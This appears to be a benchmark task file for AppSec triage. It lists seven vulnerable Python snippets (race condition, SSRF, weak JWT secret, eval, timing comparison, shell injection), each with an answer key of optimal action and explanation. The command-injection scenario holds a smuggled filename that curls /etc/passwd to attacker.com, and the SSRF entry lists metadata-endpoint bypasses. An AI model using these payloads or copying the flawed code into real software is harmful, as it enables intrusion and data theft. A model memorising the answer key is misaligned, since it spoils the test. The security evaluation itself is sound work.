@@ -1,0 +1,77 @@
+{
+  "task_id": "appsec_hard",
+  "difficulty": "hard",
+  "description": "Seven highly ambiguous AppSec scenarios with conflicting signals, partial mitigations, and complex trade-offs. Requires optimal decision strategy.",
+  "scenarios": [
+    {
+      "id": "hard_toctou_payment",
+      "code_snippet": "from decimal import Decimal\nfrom app.db import session\nfrom app.models import Account\n\ndef transfer_funds(from_id: int, to_id: int, amount: Decimal) -> bool:\n    src = session.query(Account).filter_by(id=from_id).first()\n    dst = session.query(Account).filter_by(id=to_id).first()\n\n    if src.balance >= amount:        # CHECK\n        src.balance -= amount        # USE  (no lock between check and use)\n        dst.balance += amount\n        session.commit()\n        return True\n    raise InsufficientFundsError('Balance too low')",
+      "detected_issue": "TOCTOU Race Condition: Balance read and decremented in separate, non-atomic operations without row-level database locking.",
+      "severity": "critical",
+      "context": "Payment processing service handling real-money bank transfers. Deployed as 8 auto-scaled instances. High load (5K TPS). Concurrent double-spend requests have been observed in load tests, allowing accounts to go below zero.",
+      "is_false_positive": false,
+      "optimal_action": "escalate",
+      "explanation": "TOCTOU in a financial transaction requires architectural redesign (SELECT FOR UPDATE, optimistic locking, or distributed transaction saga). Cannot be auto-fixed — escalate to security architecture team."
+    },
+    {
+      "id": "hard_ssrf_partial_mitigation",
+      "code_snippet": "import urllib.request\nimport urllib.parse\n\nBLOCKED = {'169.254.169.254', '127.0.0.1', 'localhost', '0.0.0.0'}\n\ndef fetch_user_avatar(url: str) -> bytes:\n    host = urllib.parse.urlparse(url).hostname\n    if host in BLOCKED:\n        raise ValueError('Blocked host')\n    with urllib.request.urlopen(url, timeout=5) as resp:\n        return resp.read()",
+      "detected_issue": "SSRF with Incomplete Blocklist: Server-Side Request Forgery mitigation uses a denylist that is bypassable via DNS rebinding, IPv6 aliases (::1), or decimal IP notation (2130706433 = 127.0.0.1).",
+      "severity": "high",
+      "context": "Avatar image fetcher in SaaS platform. AWS EC2 metadata endpoint (169.254.169.254) is partially blocked but reachable via IPv6 equivalent (::ffff:169.254.169.254) or redirect chains through attacker-controlled DNS.",
+      "is_false_positive": false,
+      "optimal_action": "escalate",
+      "explanation": "Denylist-based SSRF defenses are fundamentally bypassable. Correct fix requires allowlist (known CDN domains only) + DNS resolution verification. Needs security architecture input — escalate."
+    },
+    {
+      "id": "hard_jwt_weak_secret",
+      "code_snippet": "import jwt\n\nSECRET_KEY = 'secret'\n\ndef create_token(user_id: int, role: str) -> str:\n    payload = {'user_id': user_id, 'role': role}\n    return jwt.encode(payload, SECRET_KEY, algorithm='HS256')\n\ndef verify_token(token: str) -> dict:\n    return jwt.decode(token, SECRET_KEY, algorithms=['HS256'])",
+      "detected_issue": "Weak JWT Secret: HS256 JWT signed with a trivially guessable secret ('secret'), enabling token forgery for privilege escalation.",
+      "severity": "critical",
+      "context": "API gateway authentication for a multi-tenant SaaS. Token payload contains 'role' field (values: user/admin/superadmin). Attacker who brute-forces the secret can forge admin tokens with no rate limiting on /api/* endpoints.",
+      "is_false_positive": false,
+      "optimal_action": "escalate",
+      "explanation": "Weak JWT secret allows full auth bypass and role escalation. Critical. Additionally, lack of expiry (no 'exp' claim) and no token revocation means issued tokens are permanent. Escalate immediately."
+    },
+    {
+      "id": "hard_eval_partial_sanitization",
+      "code_snippet": "import re\n\nALLOWED = re.compile(r'^[0-9+\\-*/().\\s]+$')\n\ndef safe_calc(expression: str) -> float:\n    if not ALLOWED.match(expression):\n        raise ValueError('Invalid characters in expression')\n    return eval(expression)",
+      "detected_issue": "Code Injection via eval(): eval() used on user-controlled input. Regex allowlist may be insufficient to prevent all injection vectors.",
+      "severity": "high",
+      "context": "Calculator widget in a public-facing API. Regex blocks letters and special characters. However, Python's eval() can still be abused with allowed chars — e.g., __builtins__ is not directly accessible but exfiltration may be possible via creative arithmetic manipulation or timing.",
+      "is_false_positive": false,
+      "optimal_action": "fix",
+      "explanation": "eval() with allowlist regex is the wrong approach; use ast.literal_eval() or a dedicated math-expression parser (simpleeval library). The regex is bypassable in creative ways."
+    },
+    {
+      "id": "hard_timing_attack_auth",
+      "code_snippet": "def verify_api_key(provided_key: str, stored_key: str) -> bool:\n    if len(provided_key) != len(stored_key):\n        return False\n    for a, b in zip(provided_key, stored_key):\n        if a != b:\n            return False\n    return True",
+      "detected_issue": "Timing Side-Channel: Character-by-character comparison enables timing attacks to recover API keys one character at a time.",
+      "severity": "medium",
+      "context": "API key verification in authentication middleware. Keys are 64-char hex strings. Attacker can measure sub-millisecond response time differences over thousands of requests to deduce valid key characters.",
+      "is_false_positive": false,
+      "optimal_action": "fix",
+      "explanation": "Non-constant-time string comparison leaks key material via timing. Fix: use hmac.compare_digest(provided_key, stored_key) which is guaranteed constant-time."
+    },
+    {
+      "id": "hard_system_random_fp",
+      "code_snippet": "import os\n\ndef generate_session_token(length: int = 32) -> str:\n    return os.urandom(length).hex()\n\ndef generate_csrf_token() -> str:\n    import secrets\n    return secrets.token_urlsafe(32)",
+      "detected_issue": "Weak Randomness: os.urandom() flagged as potentially predictable in some environments; secrets module not used consistently.",
+      "severity": "medium",
+      "context": "Session and CSRF token generation in web framework. os.urandom() reads from /dev/urandom on Linux (cryptographically secure). secrets module wraps os.urandom() internally. Both are cryptographically safe.",
+      "is_false_positive": true,
+      "optimal_action": "ignore",
+      "explanation": "False positive. os.urandom() is cryptographically secure on all modern OSes. secrets.token_urlsafe() is semantically equivalent. The scanner incorrectly flagged os.urandom as 'weak'."
+    },
+    {
+      "id": "hard_command_injection_subprocess",
+      "code_snippet": "import subprocess\nimport shlex\n\ndef run_linter(filename: str) -> str:\n    # Sanitize filename by checking extension\n    if not filename.endswith('.py'):\n        raise ValueError('Only .py files allowed')\n    cmd = f'pylint {filename} --output-format=json'\n    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)\n    return result.stdout",
+      "detected_issue": "Command Injection: subprocess.run() called with shell=True and unsanitized filename. Extension check is insufficient to prevent injection.",
+      "severity": "critical",
+      "context": "CI/CD pipeline linting service accepting filenames from webhook payloads. Filename like 'file.py; curl https://attacker.com/exfil?data=$(cat /etc/passwd) #.py' passes the .endswith('.py') check but injects a shell command.",
+      "is_false_positive": false,
+      "optimal_action": "escalate",
+      "explanation": "Command injection via shell=True. Simple extension check is bypassed by embedding commands before the extension. Critical in CI/CD with elevated permissions. Fix: shell=False with list args, but given context escalation is warranted."
+    }
+  ]
+}
